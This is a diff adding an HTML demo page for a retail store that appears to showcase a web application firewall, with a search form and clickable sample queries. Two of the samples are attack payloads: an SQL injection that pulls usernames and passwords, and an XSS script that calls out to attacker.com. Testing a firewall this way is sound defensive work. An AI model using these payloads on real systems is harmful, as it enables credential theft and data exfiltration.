@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apex Store | Protected by WireFall WAF</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --bg-main: #0b0f19;
+            --panel-bg: #111827;
+            --border: #1f2937;
+            --cf-orange: #f97316;
+            --text-white: #f8fafc;
+            --text-muted: #94a3b8;
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-main);
+            color: var(--text-white);
+            margin: 0;
+            padding: 0;
+        }
+
+        header {
+            background: var(--panel-bg);
+            border-bottom: 1px solid var(--border);
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .waf-badge {
+            background: rgba(249, 115, 22, 0.15);
+            border: 1px solid var(--cf-orange);
+            color: var(--cf-orange);
+            padding: 0.3rem 0.75rem;
+            border-radius: 9999px;
+            font-size: 0.8rem;
+            font-weight: 700;
+            text-transform: uppercase;
+        }
+
+        .container {
+            max-width: 1000px;
+            margin: 2rem auto;
+            padding: 0 1rem;
+        }
+
+        .card {
+            background: var(--panel-bg);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 2rem;
+            margin-bottom: 2rem;
+        }
+
+        h2 { font-size: 1.25rem; margin-top: 0; display: flex; align-items: center; gap: 0.5rem; }
+
+        .search-box {
+            display: flex;
+            gap: 0.75rem;
+            margin-top: 1rem;
+        }
+
+        input {
+            flex: 1;
+            background: #05070d;
+            border: 1px solid var(--border);
+            color: #fff;
+            padding: 0.85rem 1rem;
+            border-radius: 8px;
+            font-size: 0.95rem;
+        }
+
+        button {
+            background: var(--cf-orange);
+            color: #fff;
+            border: none;
+            padding: 0.85rem 1.5rem;
+            border-radius: 8px;
+            font-weight: 700;
+            cursor: pointer;
+        }
+
+        button:hover { background: #ea580c; }
+
+        .exploit-hints {
+            margin-top: 1.5rem;
+            background: #05070d;
+            border: 1px dashed var(--border);
+            padding: 1rem;
+            border-radius: 8px;
+            font-size: 0.85rem;
+            color: var(--text-muted);
+        }
+
+        .exploit-hints code {
+            color: var(--cf-orange);
+            font-family: monospace;
+            cursor: pointer;
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <div style="font-weight: 800; font-size: 1.2rem;">
+            🛒 Apex Retail Store
+        </div>
+        <div class="waf-badge">
+            <i class="fas fa-shield-halved"></i> WireFall WAF Active
+        </div>
+    </header>
+
+    <div class="container">
+        <div class="card">
+            <h2><i class="fas fa-search" style="color: var(--cf-orange);"></i> Search Catalog (Protected Form)</h2>
+            <p style="color: var(--text-muted); font-size: 0.9rem;">Test searching for products or try sending an attack payload through WireFall WAF:</p>
+            
+            <form action="/app/search" method="GET" class="search-box">
+                <input type="text" name="q" id="queryInput" placeholder="Enter product search query...">
+                <button type="submit">Search Catalog</button>
+            </form>
+
+            <div class="exploit-hints">
+                <b>💡 Try clicking these test queries:</b>
+                <ul>
+                    <li>Benign Query: <code onclick="setQuery('wireless noise canceling headphones')">wireless noise canceling headphones</code></li>
+                    <li>SQL Injection Attack: <code onclick="setQuery('admin\' UNION SELECT 1, username, password FROM users--')">admin' UNION SELECT 1, username, password FROM users--</code></li>
+                    <li>XSS Attack Payload: <code onclick="setQuery('<script>fetch(\'http://attacker.com/steal\')</script>')">&lt;script&gt;fetch('http://attacker.com/steal')&lt;/script&gt;</code></li>
+                </ul>
+            </div>
+        </div>
+
+        <div style="text-align: center; color: var(--text-muted); font-size: 0.85rem;">
+            <a href="/dashboard/" style="color: var(--cf-orange); text-decoration: none; font-weight: 700;">View Live WAF Monitor Dashboard &rarr;</a>
+        </div>
+    </div>
+
+    <script>
+        function setQuery(text) {
+            document.getElementById("queryInput").value = text;
+        }
+    </script>
+</body>
+</html>
